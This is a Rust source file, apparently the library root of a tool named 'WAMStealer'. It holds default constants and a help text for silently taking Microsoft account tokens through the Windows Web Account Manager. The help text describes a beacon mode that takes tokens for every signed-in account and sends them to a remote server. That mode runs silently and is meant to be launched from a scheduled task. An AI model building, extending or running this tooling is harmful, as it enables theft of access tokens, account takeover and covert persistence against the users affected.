//! The platform-independent CLI and request/output contracts of the native client.
pub mod beacon;
pub mod options;
pub mod report;

#[cfg(windows)]
pub mod wam;

pub const DEFAULT_CLIENT_ID: &str = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
pub const DEFAULT_SCOPE: &str = "https://graph.microsoft.com/.default";
pub const DEFAULT_AUTHORITY: &str = "common";
pub const PROVIDER_ID: &str = "https://login.microsoft.com";
pub const CAE_CLAIMS: &str = r#"{"access_token":{"xms_cc":{"values":["cp1"]}}}"#;
pub const RESERVED_SCOPES: &str = " openid offline_access profile";

pub const HELP: &str = "WAMStealer - silent Windows WAM token acquisition (Rust)

Usage: wamstealer [options]

  --server URL            Beacon mode: request tokens for every account and send
                          them to an WAMStealer server over HTTPS
  --secret VALUE          Shared secret of the WAMStealer server (required with --server)
  --client-id VALUE       Public client ID (default: Microsoft Office)
  --scope VALUE           v2 scope string (default: Graph .default)
  --resource VALUE        WAM v1-compatible resource; exclusive with --scope
  --authority VALUE       Provider authority (default: common)
  --enum                  Enumerate accounts and exit
  --account-id VALUE      Select an exact WAM account ID
  --username VALUE        Select one exact, unique username (case-insensitive)
  --claims-json VALUE     Raw OAuth claims object
  --cae                   Request CAE client capability cp1
  --hide                  Omit the token from output
  --timeout-seconds N     1-300 seconds per operation (default: 30)
  -h, --help              Show this help

Beacon mode fetches the client ID, scope, and authority from the server's
/config endpoint and falls back to the compiled defaults when unreachable.
It never prints anything, succeeds or fails silently, and is intended to run
from a scheduled task.

Scope mode adds openid, offline_access, and profile for WAM v2 compatibility.
Resource mode sends an empty scope plus the WAM resource property.
Without --server the client prints JSON reports and never performs
interactive authentication.
";
